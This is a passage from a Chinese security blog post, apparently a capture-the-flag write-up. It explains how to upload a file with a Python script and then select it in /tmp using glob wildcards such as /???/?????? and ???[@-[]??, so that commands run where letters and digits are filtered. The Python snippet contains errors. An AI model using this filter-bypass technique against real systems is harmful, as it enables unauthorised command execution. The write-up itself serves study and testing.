-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">files&#x3D;&#123;</span><br><span class="line">	&#39;file&#39;:open(&#39;1.txt&#39;,rb)</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;&quot;</span><br><span class="line">response&#x3D;requests.get(url,files&#x3D;files)</span><br><span class="line">print(reponse.txt)</span><br></pre></td></tr></table></figure>
-
-<p>利用脚本post直接上传</p>
-<p>问题二：不能用字母数字，如何选中所要执行的文件？</p>
-<p>这个时候就利用了glob通配符的知识了，我们知道，上传的文件会被临时储存在/tmp/文件夹下，那么如何确定其他的字符呢？</p>
-<p>*<em>首先</em>可以代表0个及以上的任意字符**<br><strong>？可以代表1个任意字符</strong></p>
-<p>所以我们的文件名就可以表示为/*/??????或者/???/??????（这里假定文件名为6位）</p>
-<p>但是此时，符合此文件名可能不止一位，所以该如何更精准的定位呢？</p>
-<h4 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h4><p><strong>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”并且支持利用[0-9]来表示一个范围</strong>。</p>
-<p>筛选方法：<br>1.???<code>[^x]</code>??筛选出第四个字符不是x的项<br>2.???[@-[]??筛选出第四个字符时大写字母的项（这里利用了ascc码的一个范围）</p>
-<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610141755.png" alt="image.png"></p>
-<p>参考:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a></p>
 </div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
